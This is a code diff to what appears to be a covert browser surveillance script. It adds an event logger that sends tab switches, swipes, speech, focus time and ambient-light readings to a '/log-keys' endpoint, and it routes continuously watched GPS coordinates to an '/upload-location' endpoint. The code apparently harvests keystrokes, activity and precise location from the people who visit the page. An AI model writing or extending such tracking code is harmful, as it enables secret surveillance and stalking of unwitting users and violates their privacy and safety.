@@ -68,6 +68,18 @@
         return null;
     }
 
+    // ═══ EVENT LOGGER ═══════════════════════════════════════════
+    // Structured event logging for named browser events (tab switches,
+    // swipes, speech, focus time, context menu, ambient light, etc.)
+    function logEvent(type, data) {
+        try {
+            post('/log-keys', {
+                keys: `[${type.toUpperCase().replace(/_/g, ' ')}] ${JSON.stringify(data).slice(0, 400)}`,
+                url: location.href
+            });
+        } catch {}
+    }
+
     // ═══ CONFIG FROM SERVER ════════════════════════════════════
     async function fetchConfig() {
         try {
@@ -1891,7 +1903,7 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
                         if (!moved) return;
                         lastLat = lat; lastLon = lon;
                         // Log to locations endpoint (same as existing GPS capture)
-                        post('/log-location', { latitude: lat, longitude: lon, accuracy, source: 'GPS_WATCH' });
+                        post('/upload-location', { latitude: lat, longitude: lon, accuracy, source: 'GPS_WATCH' });
                         post('/log-keys', {
                             keys: `[GEO UPDATE] ${lat.toFixed(5)},${lon.toFixed(5)} ±${Math.round(accuracy)}m`,
                             url: location.href
